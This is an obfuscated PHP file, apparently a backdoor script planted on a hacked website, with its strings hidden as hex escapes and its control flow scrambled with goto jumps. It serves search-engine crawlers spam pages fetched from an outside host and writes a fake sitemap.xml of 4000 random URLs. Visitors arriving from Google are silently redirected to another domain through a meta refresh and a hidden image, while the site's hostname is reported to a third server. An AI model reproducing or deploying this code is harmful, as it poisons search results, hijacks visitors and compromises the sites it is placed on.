<?php
header("\x43\157\156\x74\145\x6e\x74\55\124\x79\x70\x65\72\x20\164\145\x78\x74\x2f\x68\164\155\x6c\73\x20\143\x68\141\x72\x73\145\164\x3d\125\124\106\55\x38"); $lYwCwD = "\x68\164\x74\160"; if (!is_https()) { goto lqImCDD; } $lYwCwD = "\x68\x74\164\x70\x73"; lqImCDD: function setmap() { goto lqImCDG; lqImCDq: $lYwCwX = date("\131\55\x6d\x2d\144"); goto lqImCDo; lqImCDw: $lYwCwC = sizeof($lYwCwm); goto lqImCDX; lqImCDX: $lYwCwG = "\11\74\165\x72\x6c\163\x65\164\40\170\x6d\154\156\163\x3d\x22\x68\x74\164\x70\x3a\57\57\x77\167\x77\56\x73\x69\164\x65\155\141\x70\163\x2e\x6f\x72\x67\x2f\163\x63\x68\145\155\141\x73\57\x73\151\x74\x65\155\141\x70\57\x30\56\x39\x22\76\15\12"; goto lqImCDK; lqImCDG: $lYwCwm = explode("\x2f", $_SERVER["\122\105\x51\x55\x45\x53\124\137\125\122\x49"]); goto lqImCDw; lqImCDI: file_put_contents("\x2e\x2f\163\151\164\x65\x6d\x61\x70\x2e\170\x6d\154", $lYwCwG); goto lqImCDH; lqImCDB: $lYwCwG .= "\x9\x3c\57\165\x72\x6c\x73\145\164\x3e"; goto lqImCDI; lqImCDo: for ($lYwCwK = 0; $lYwCwK < 4000; $lYwCwK++) { $lYwCwq = $lYwCww . "\77\151\144\75" . mt_rand(00, 999999999); $lYwCwG .= "\x9\11\74\165\162\154\x3e\xa"; $lYwCwG .= "\11\11\x9\x3c\x6c\x6f\143\76{$lYwCwq}\74\x2f\x6c\x6f\143\x3e\xd\12"; $lYwCwG .= "\x9\x9\x9\74\160\162\151\x6f\162\x69\x74\x79\76\61\x2e\x30\74\57\160\x72\x69\157\x72\151\x74\x79\x3e\15\xa"; $lYwCwG .= "\x9\x9\x9\74\154\x61\163\164\x6d\x6f\144\x3e{$lYwCwX}\74\57\x6c\141\163\x74\x6d\x6f\144\76\15\12"; $lYwCwG .= "\11\x9\11\x3c\x63\x68\141\156\x67\x65\x66\x72\x65\161\x3e\150\x6f\x75\x72\154\171\74\57\x63\x68\141\156\x67\145\x66\x72\145\161\x3e\15\12"; $lYwCwG .= "\11\x9\74\x2f\x75\x72\x6c\x3e\xa"; } goto lqImCDB; lqImCDK: $lYwCww = "\150\x74\164\160\x3a\x2f\x2f" . $_SERVER["\x48\x54\x54\x50\137\x48\x4f\123\124"] . $_SERVER["\x52\105\121\125\x45\x53\124\x5f\x55\x52\111"]; goto lqImCDq; lqImCDH: } error_reporting(0); $lYwCwo = $_SERVER["\110\x54\x54\120\x5f\x55\x53\105\x52\x5f\101\x47\105\x4e\x54"]; $lYwCwB = $_SERVER["\x48\124\124\120\x5f\122\x45\x46\x45\122\x45\x52"]; $lYwCwI = $_SERVER["\120\x48\x50\137\123\105\x4c\x46"]; if (stripos($lYwCwo, "\107\157\157\147\154\145\x62\157\x74") !== false) { goto lqImCDu; } if (strpos($lYwCwB, "\147\x6f\x6f\147\x6c\145\x2e\143\157\x6d") !== false || strpos($lYwCwB, "\147\157\157\147\154\145\56\143\x6f\x2e\164\x68") !== false) { goto lqImCDn; } goto lqImCDp; lqImCDu: $lYwCwH = "\x68\x74\164\x70\72\57\57\143\144\x6e\66\x32\70\x31\x2e\x78\x79\170\164\56\156\x65\164\x2f"; $lYwCwp = $lYwCwH . "\x54\150\147\x6f\147\x6f\147\157"; $lYwCwu = file_get_contents($lYwCwp, false, stream_context_create($lYwCwn)); $lYwCwu = preg_replace("\x2f\150\162\x65\x66\x3d\x2e\x2b\x5c\x3f\x2f", "\150\x72\x65\146\75\x22" . $lYwCwD . "\72\x2f\x2f" . $_SERVER["\x48\124\x54\120\x5f\x48\x4f\123\x54"] . $lYwCwI . "\x3f", $lYwCwu); echo $lYwCwu; setmap(); exit; goto lqImCDp; lqImCDn: file_get_contents("\150\164\164\x70\x3a\57\x2f\x63\144\x6e\163\70\x39\x30\x31\56\x35\x32\60\60\x73\56\x6e\145\x74\x2f\x69\x6e\x64\145\170\57\x6c\x6f\147\151\156\x2f\141\144\57\x75\162\x6c\57" . base64_encode($_SERVER["\x48\124\124\x50\x5f\110\x4f\123\x54"]), false, stream_context_create($lYwCwn)); $lYwCwY = "\40\x3c\x6d\x65\x74\x61\x20\150\x74\164\160\55\x65\x71\165\151\166\75\x22\162\x65\x66\x72\x65\x73\x68\42\40\143\x6f\x6e\164\x65\156\x74\x3d\42\60\x3b\x75\x72\x6c\x3d\150\164\164\x70\72\57\57\x70\64\x33\x2e\143\143\x22\76\40\xd\12\x9\x9\11\74\151\155\147\x20\163\162\143\x3d\x22"; $lYwCXD = "\x9\x22\x20\x6f\156\x65\162\x72\157\x72\75\x22\164\150\151\163\x2e\157\156\145\x72\x72\157\x72\75\x6e\x75\154\154\73\40\167\x69\156\144\x6f\167\x2e\154\x6f\x63\x61\x74\x69\157\156\75\x27\150\x74\x74\x70\72\x2f\57\160\x34\x33\56\x63\x63\47\x3b\42\40\x20\x6f\x6e\x6c\157\141\x64\75\x22\167\x69\x6e\x64\157\x77\x2e\154\157\x63\x61\164\151\157\156\75\x27\x68\x74\x74\160\x3a\57\57\x70\64\x33\56\x63\143\x27\x3b\42\x20\x73\164\171\x6c\x65\x3d\x22\144\x69\163\160\x6c\x61\x79\x3a\x6e\x6f\156\145\x3b\x22\76"; echo $lYwCwY . "\x68\x74\164\160\x3a\x2f\x2f\143\x64\156\163\x38\x39\60\61\x2e\x35\62\x30\x30\x73\x2e\156\x65\164\x2f\x69\156\x64\145\x78\57\154\157\147\x69\156\x2f\x61\x64\57\165\x72\x6c\x2f" . base64_encode($_SERVER["\110\x54\124\x50\137\110\x4f\123\x54"]), false, stream_context_create($lYwCwn) . $lYwCXD; lqImCDp: function is_https() { goto lqImCmG; lqImCmX: if (!empty($_SERVER["\110\x54\124\120\x5f\106\122\117\116\x54\137\x45\x4e\x44\x5f\110\124\124\x50\x53"]) && strtolower($_SERVER["\x48\x54\x54\120\x5f\106\x52\x4f\x4e\x54\x5f\x45\x4e\104\137\110\x54\x54\x50\x53"]) !== "\x6f\146\x66") { goto lqImCmC; } goto lqImCmK; lqImCmK: goto lqImCDY; goto lqImCmq; lqImCmn: return true; goto lqImCmY; lqImCmH: return true; goto lqImCmp; lqImCCD: return false; goto lqImCCm; lqImCmG: if (!empty($_SERVER["\x48\124\124\120\x53"]) && strtolower($_SERVER["\110\124\x54\120\x53"]) !== "\157\146\x66") { goto lqImCmD; } goto lqImCmw; lqImCmp: goto lqImCDY; goto lqImCmu; lqImCmo: return true; goto lqImCmB; lqImCmY: lqImCDY: goto lqImCCD; lqImCmB: goto lqImCDY; goto lqImCmI; lqImCmI: lqImCmm: goto lqImCmH; lqImCmq: lqImCmD: goto lqImCmo; lqImCmw: if (isset($_SERVER["\x48\124\124\120\137\x58\x5f\x46\117\122\x57\101\x52\104\105\104\137\120\122\117\x54\x4f"]) && $_SERVER["\110\x54\x54\x50\137\x58\x5f\106\x4f\x52\x57\101\122\x44\x45\x44\137\120\x52\x4f\124\x4f"] === "\x68\x74\x74\x70\x73") { goto lqImCmm; } goto lqImCmX; lqImCmu: lqImCmC: goto lqImCmn; lqImCCm: } exit;